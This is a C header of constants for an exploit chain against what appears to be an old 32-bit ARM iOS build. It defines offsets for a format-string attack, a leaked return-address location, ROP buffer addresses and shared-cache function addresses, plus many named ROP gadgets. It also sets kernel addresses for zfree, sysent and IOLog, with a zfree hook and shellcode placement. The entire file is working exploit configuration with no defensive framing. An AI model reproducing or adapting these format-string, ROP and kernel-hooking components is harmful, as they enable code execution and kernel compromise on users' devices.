#define DEBUG
#define STRLEN_PID	2
#define LOG_SHIFT	(35 + STRLEN_PID)

// (*p1)==p2, this is the trick to exploit format strings on OSX
// p3 is an unused param that'll be used as a pointer to any address
#define P1		619
#define P2		625
#define P3		678
//   p2 address: 0x2fdffe[44]
#define P3_ADDR_LO 0x44 + (P3 - P2) * 4;

// saved LR inside _vasprintf_l, after the call to j__malloc_zone_malloc
// address of #605 :
// 	<p2 address> - (p2 - 605) * 4
// 	0x2fdffe44 - (625 - 605) * 4 = 0x2fdffdf4
#define LEAKED_LIBC_SAVED_LR_ADDR 0x2fdffdf4
#define LEAKED_LIBC_SAVED_LR_SHOULD_BE 0x320991b3

#define ROP_ABS_ADDR 0x2fdffe30
#define ROP2_ABS_ADDR 0x3eb00000
#define ROP3_ABS_ADDR 0x3eb01000
#define ROP3_MAX_SIZE 0x1f000
#define VARS_ABS_ADDR_1 0x3eb20000
#define VARS_ABS_ADDR_2 0x3eb21000

#ifdef DEBUG
	#define _syslog 0x69fc8
#endif
#define _dsc_mmap 0x307c5658 + 1
#define _dsc_open 0x307d4dc4
#define _dsc_mkdir 0x307c7c34
#define _dsc_ioctl 0x307c6bf8 + 1
#define _dsc_close 0x307c571c
#define _dsc_exit 0x320a49d0 + 1
#define _dsc_mount 0x307d66e4
#define _dsc_unmount 0x307d7040
#define _dsc_fopen 0x320a2004 + 1
#define _dsc_fclose 0x320a265c + 1
#define _dsc_fread 0x320a8814 + 1
#define _dsc_syscall 0x307d5afc

#define POP_R12457 0x4502a + 1
#define POP_R234567 0x4e128 + 1
#define MOV_R012_R654__BLX_R3__MOV_R1_R0__MOV_R0_R1__POP_R4567 0x3f54 + 1
#define BLX_R3__MOV_R1_R0__MOV_R0_R1__POP_R4567 0x3f5a + 1
#define POP_R47 0x279e + 1
#define MOV_SP_R4__POP_R457 0x3d382 + 1
#define STR_R1_R4__POP_R457 0x3c126 + 1
#define LDR_R0_R4_8__ADD_SP_4__POP_R457 0xcbe2 + 1
#define MOV_R3_R0__MOV_R0_R3__POP_R7 0x11a00 + 1
#define MOV_R0_R4__POP_R47 0x3ee72 + 1
#define STR_R0_R4__MOV_R0_R1__POP_R47 0x387a6 + 1
#define CMP_R0_0__IT_NE__LDRNE_R1_R0__MOV_R0_R1__POP_R7 0x3d22 + 1
#define SUBS_R0_R1__CMP_R0_3__IT_NE__POPNE_R47 0x4a16a + 1
#define MOV_R1_R0__MOV_R0_R1__POP_R7 0x3d3e + 1
#define POP_R0457 0x4502c + 1
#define ADDLE_R0_R1__ADD_SP_4__POP_R7 0x3c0ac + 1

#define LIBC_POP_R0123 0x32109b10
#define LIBC_BLX_R4_POP_R47 0x320bcf38 + 1

#define ROP_FILE_NAME "payload"
#define VARS_FILE_NAME "payload-vars"
#define VARS_MAX_SIZE 0x1000

#define PLACE_HOLDER 0xdeadbeef
#define USELESS 0xdeadface

#define ZFREE		(0x8002f3d0 + 1)
#define SYSENT		0x802ccbac
#define IOLOG		(0x80203edc + 1)

#define SHELLCODE_ADDR 0x80000400
#define ZFREEHOOK_ADDR (ZFREE - 1)
#define ZFREEHOOKER_ADDR 0x80000600

#define SHELLCODE_LEN 400
#define ZFREEHOOK_LEN 8
#define ZFREEHOOKER_LEN 60
